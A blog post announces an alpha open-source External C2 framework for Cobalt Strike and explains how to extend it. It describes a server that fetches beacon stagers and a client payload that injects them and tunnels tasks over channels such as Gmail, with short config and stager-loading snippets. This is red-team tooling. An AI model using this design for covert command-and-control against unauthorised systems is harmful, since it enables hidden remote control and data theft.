---
title: External C2 framework for Cobalt Strike
published: true
layout: post
description: Alpha release of External C2 framework
author: Jonathan Echavarria
---

Today, I am officailly releasing the alpha version of my implementation for Cobalt Strike's [external c2 spec](https://www.cobaltstrike.com/downloads/externalc2spec.pdf). Currently, it is lacking the builder routine and a few additional features that will be implemented at a later time, but what is available will be a provides a good idea of where this project will go, and hopefully enhance your experience.

This post will discuss how to use it, and provide a tutorial on how to build your own `transport` and `encoder` modules to add your desired functionality.

You can access the framework here: https://github.com/Und3rf10w/external_c2_framework

# Intro
Personally, I always give nothing but praise to Cobalt Strike's design. It's a great tool, designed to be very modular and modifiable, and compared to other offerings on the market, very reasonably prices (e.g. not $50k). With a well-featured base product, it also offers a scripting language, [Aggressor](https://www.cobaltstrike.com/aggressor-script/index.html), which is essentially Rafael Mudge's Java scripting language, [Sleep](http://sleep.dashnine.org/manual/). I've always said that if you're willing to put in the work to create Aggressor scripts and other minor modifications to fit your needs, you can easily enhance the value of Cobalt Strike to that of tools that cost more than 15 times what you paid for it.

Unfortunately, the only area it was lacking was that the data channels that the beacon payload were somewhat limited, which is a major feature of other offerings in the space. Imagine my surprise, and excitement, [when I learned about the external c2 specification](https://blog.cobaltstrike.com/2017/10/03/kits-profiles-and-scripts-oh-my/)!

To date, there have been [a few](https://github.com/ryhanson/ExternalC2) [different](https://labs.mwrinfosecurity.com/blog/tasking-office-365-for-cobalt-strike-c2) [releases](https://github.com/outflanknl/external_c2) of implementations/discussions around the spec, but they are in a language that I'm not familiar with (`¯\_(ツ)_/¯`), or do not have the features that I desire.

Keeping the design philosophy of Cobalt Strike in mind, I took it upon myself to construct a modular implementation of the spec that would be easy and straight forward to create new communcation channels for.

# Overview
The framework consists of 3 main parts:
* Builder (not yet implemented)
* Server
* Client

# Server
The server is the application that brokers communication between the `client` and the `c2 server`, referred to as `third-party Client Controller` within the spec. The server logic is primarily static, but supports verbose and debug output to assist with development:
1. Parse the configuration
2. Import the specified encoding module
3. Import the specified transport module
4. Establish a connection to the c2 server
5. Request a stager from the c2 server
6. Encode the stager with the `encoder` module
7. Transport the stager with the `transport` module
8. Await for a metadata response from the client received via the `transport`
9. Decode the metadata with the `encoder` module
10. Relay the metadata to the c2 server.
11. Receive a new task from the c2 server.
12. Encode the new task
13. Relay the new task to the client via the `transport`
14. Receive for a response from the client received via the `transport`
15. Decode the response via the `encoder` module
16. Relay the response to the c2 server.
17. Repeat steps 11-16

The determination of which `encoder` and `transport` module the server imports is determined from the values stored in config.py.

No imports of ununsed `transport` or `encoder` modules are performed.

Let's look at how the server works:

## server.py
Main part of the server is at the root of the `server` folder and upon building, is aptly named `server.py`

Looking at the `main()` function, we can see the server first parses arguments (at this time just `verbose` and `debug` flags), parses a config file, `config.py`, imports the specified `transport` and `encoder` modules, then begins the main logic of communicating to the c2 server and client.

## config.py
Distributed with the server in a configuartion file, `config.py` that allows us to specificy the connection to the c2 server, options passed for the stager, idle time for polling of the transport and c2, which `encoder` and `transport` to use, and output options (which can be specified with flags as well).

```python
# Address of External c2 server
EXTERNAL_C2_ADDR = "127.0.0.1"

# Port of external c2 server
EXTERNAL_C2_PORT = "2222"

# The name of the pipe that the beacon should use
C2_PIPE_NAME = "foobar"

# A time in milliseconds that indicates how long the External C2 server should block when no new tasks are available
C2_BLOCK_TIME = 100

# Desired Architecture of the Beacon
C2_ARCH = "x86"

# How long to wait (in seconds) before polling the server for new tasks/responses
IDLE_TIME = 5

ENCODER_MODULE = "encoder_b64url"
TRANSPORT_MODULE = "transport_gmail"

# Anything taken in from argparse that you want to make avaialable goes here:
verbose = False
debug = False
```

## configureStage module
The `configureStage` module defines the logic for loading the beacon stager on the client host. Currently, it is configured to immediately retrieve the stager from the c2 server, transmit it to the client, and await for a response from the client. If you'd like to modify this order of operations, you can change the logic of the `configureStage.loadStager()` function.

For example, perhaps you'd like to recieve some sort of confirmation that the client is ready before requesting a stager from the c2 server:

Instead of the default logic:
```python
configureOptions(sock, config.C2_ARCH, config.C2_PIPE_NAME, config.C2_BLOCK_TIME)
stager_payload = requestStager(sock)
commonUtils.sendData(stager_payload)
metadata = commonUtils.retrieveData()
commonUtils.sendFrameToC2(sock, metadata)
return 0
```

You may want something like this:
```python
configureOptions(sock, config.C2_ARCH, config.C2_PIPE_NAME, config.C2_BLOCK_TIME)

# Recieve the ready notification from the client
clientReady = commonUtils.retrieveData()

# Request the stager now that the client is ready
stager_payload = requestStager(sock)
commonUtils.sendData(stager_payload)
metadata = commonUtils.retrieveData()
commonUtils.sendFrameToC2(sock, metadata)
return 0
```

## establishedSession module
The `establishedSession` module defines the logic for how the server communicates to a client that the client once its has injected the beacon payload. There isn't much need to make modifications to this logic, as it primarily exists to increase readability.

## utils modules
The `utils` module holds the `commonUtils.py` submodule, and the various `transport` and `encoder` modules available.
The `commonUtils` sub-module provides common functions that can be utilized in other areas.
The `encoders` and `transports` folders holds the various available transports and encoders available.

### encoders
---
Encoders use the following name conventions:

`encoder_$description`.py

The two functions that need to be defined in this module are `encode()` and `decode()`.  Essentially inverses of each other they define how data transmitted and recieved is modified.

Both functions should return the data as a string.

Any imports required to make modifications to the data may be done within this file. 

### transports
---
Transports use the following name conventions:

`transport_#description`.py

If any configuration options need to be specified they may be hardcoded at the top of the file.
The three functions that need to be defined in this module are `prepTransport()`, `sendData()`, and `retrieveData()`.

`prepTransport()` defines any logic that the server/client need to perform in order to send and recieve dat via the transport. This could be anything from opening a socket, to logging into an application, etc. This should `return 0` upon successful execution.

`sendData()` defines how data is sent through the transport mechanism, and should expect to recieve already encoded data. It does not need to return anything. The builder will add a call to `encoder.encode(data)` within this function for the client. 

`retrieveData()` defines how data is receieved through the transport mechanism, and should return the raw data recived. The builder will add a call to `encoder.decode(data)` within this function for the client. This function is called `recvData()` in  

Any imports required to transport the data may be done within this file.

# Client
The client is essentially the payload that runs on the endpoint, referred to as `third-party client` within the spec. The logic of the client is primarily static:
1. Run any preparations need to be utilizing the `transport`
2. Receive the stager
3. Inject the stager and open the handle to the beacon
4. Obtain metadata from the beacon
5. Relay the metadata from the beacon to the C2 server via the `transport`
6. Watch the `transport` for new tasks
7. Relay new tasks to the beacon
8. Relay responses from the beacon via the `transport`
9. Repeat steps 6-8.

Configurations needed for the transport and encoding mechanisms are statically copied into the client. Function logic for transporting and encoding mechanisms are also statically copied into from their respective modules.

In contrast to the server, the client is distrubted as one file (not including the compiled dll), which all imports and functionality performed are for the most part inherited from server logic.

Take a look at the follow tables, which detail share functionality between the client and server:

## Transport module

| Transport Function | Client Function | Description |
| :---:| :---: | :--- |
| prepTransport | prepTransport | Performs any preconfigurations required to utilize the transport mechanism |
| sendData | sendData | Defines how data is sent through the transport mechanism |
| retrieveData | recvData | Defines how data is received through the transport mechanism

## Encoder Module

| Encoder Function | Client Function | Description |
| :---: | :---: | :--- |
| encode | encode | Defines modifications done to raw data to prepare it for transport
| decode | decode | Defines modifications done to raw data received from the transport to be relayed to its destination |

If you want to modify the way the client loads the beacon stager, you can modify the logic of the `start_beacon()` function. Just ensure it returns a handle to the beacon's named pipe.

